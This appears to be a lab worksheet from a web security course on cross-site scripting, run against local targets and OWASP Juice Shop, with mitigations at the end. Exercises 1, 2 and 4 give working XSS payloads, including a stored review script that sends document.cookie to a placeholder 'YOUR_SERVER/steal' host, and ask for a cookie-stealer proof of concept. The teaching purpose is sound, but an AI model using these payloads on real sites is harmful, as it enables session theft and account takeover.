# Week 03: Cross-Site Scripting (XSS)

## Learning Objectives
- Understand reflected, stored, and DOM-based XSS
- Craft XSS payloads to steal cookies and perform actions
- Implement Content Security Policy (CSP) and output encoding

## Exercises

### Exercise 1: Reflected XSS in Product Search
Target: `GET /products/search?q=`

```bash
# Basic test
curl "http://localhost:8080/products/search?q=<script>alert(1)</script>"

# Check if the payload reflects in the response
curl "http://localhost:8080/products/search?q=<img src=x onerror=alert('XSS')>"
```

**Questions:**
- Where in the response does the input appear?
- Is there any filtering or encoding?
- What HTML tags are blocked/allowed?

### Exercise 2: Stored XSS in Product Reviews
1. Register a user account via `/auth/register`
2. Login to get a JWT token
3. Post a review with an XSS payload:

```bash
# Register
curl -X POST http://localhost:8080/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username":"student1","email":"s1@test.com","password":"test123"}'

# Login
TOKEN=$(curl -s -X POST http://localhost:8080/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"student1","password":"test123"}' | jq -r '.token')

# Post malicious review
curl -X POST http://localhost:8080/products/1/reviews \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"comment":"<script>document.location=\"http://YOUR_SERVER/steal?cookie=\"+document.cookie</script>","rating":5}'

# View reviews to trigger the XSS
curl "http://localhost:8080/products/1/reviews"
```

**Questions:**
- Is the comment sanitized before storage?
- Does the XSS fire when reviews are loaded?
- Can you steal the admin's cookie?

### Exercise 3: XSS in Juice Shop
In Juice Shop (http://localhost:3000), find and exploit XSS vulnerabilities:

- Search bar reflected XSS
- Product review stored XSS
- DOM-based XSS (check JavaScript files)

**Hint:** Look at the feedback form and search functionality.

### Exercise 4: Cookie Theft Simulation
Set up a listener to capture stolen cookies:

```bash
# Using Python
python3 -m http.server 9999

# Or use a webhook service like webhook.site
```

Then craft XSS payloads that exfiltrate cookies to your listener.

**Questions:**
- Are cookies marked as HttpOnly?
- What cookie attributes (Secure, SameSite) are set?
- How would HttpOnly cookies prevent this attack?

### Exercise 5: Mitigation
1. Add a Content Security Policy header
2. Implement output encoding (HTML entity encoding)
3. Use `helmet` middleware in Express:

```javascript
const helmet = require("helmet");
app.use(helmet());
app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
    },
  })
);
```

## Deliverable
- Demonstrate reflected, stored XSS (screenshots)
- Create a cookie stealer PoC
- Propose CSP and encoding mitigations
